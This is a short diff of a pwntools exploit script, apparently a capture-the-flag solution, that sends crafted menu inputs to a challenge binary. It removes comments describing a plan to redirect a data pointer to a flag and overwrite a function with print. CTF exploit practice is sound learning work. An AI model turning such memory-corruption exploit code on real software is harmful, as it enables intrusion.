@@ -12,8 +12,7 @@ sa 		= lambda a,b: 	p.sendafter(a,b)
 sl		= lambda a: 	p.sendline(a)
 s 		= lambda a: 	p.send(a)
 
-# Change map's *data point to flag_map's local address
-# overwrite get_max_weight with print
+
 for i in range(4):
     sla("> ", "1")
     sla(": ", "1"+"2"*i) # (49 + 50*i) % 10 = 9
